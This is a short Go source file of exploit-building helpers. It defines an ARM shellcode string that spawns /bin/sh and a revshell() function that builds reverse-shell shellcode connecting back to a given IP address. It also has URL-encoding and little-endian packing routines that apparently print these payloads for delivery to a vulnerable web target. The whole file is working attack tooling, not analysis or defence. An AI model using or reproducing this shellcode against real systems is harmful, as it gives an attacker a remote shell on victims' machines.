package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
)

const (
	shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x0b\x27\xc1\x71\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58"
	//todo
	sixtyfour = uint64(^uint(0)) == ^uint64(0)
)

var intsize int

func init() {
	if sixtyfour {
		intsize = 8
	} else {
		intsize = 4
	}
}

type Urlencoder struct {
	wrapped io.Writer
}

//Urlencoded writing, implements io.Writer
func (u *Urlencoder) Write(p []byte) (n int, err error) {
	for _, b := range p {
		var ti int
		var towrite []byte
		if !((b >= byte('0') && b <= byte('9')) ||
			(b >= byte('a') && b <= byte('z')) ||
			(b >= byte('A') && b <= byte('Z'))) {
			towrite = []byte(fmt.Sprintf("%%%02x", b))
		} else {
			towrite = []byte{b}
		}
		ti, err = u.wrapped.Write(towrite)
		n += ti
		if err != nil {
			return
		}
	}
	return
}

func (u *Urlencoder) WriteString(s string) (n int, err error) {
	return u.Write([]byte(s))
}

func (u *Urlencoder) WritePack(i int) (n int, err error) {
	//return u.Write(pack(i))
	err = binary.Write(u.wrapped, binary.LittleEndian, i)
	return intsize, err
}

//Littleendian packing
func pack(in int) []byte {
	return []byte{
		byte(in),
		byte(in >> 8),
		byte(in >> 16),
		byte(in >> 24),
	}
}

var w = &Urlencoder{os.Stdout}

func _p(e error) {
	if e != nil {
		panic(e)
	}
}
func ws(s string) {
	_, e := w.WriteString(s)
	_p(e)
}
func wp(i int) {
	_, e := w.WritePack(i)
	_p(e)
}
func ww(b []byte) {
	_, e := w.Write(b)
	_p(e)
}

//Sample usage revshell([]byte{192, 168, 200, 1})
func revshell(ip ...byte) string {
	return "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0b\xa1\x4a\x70\xca\x73\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x40\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x05\xa0\x52\x40\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c" + string(ip) + "/bin/shX"
}
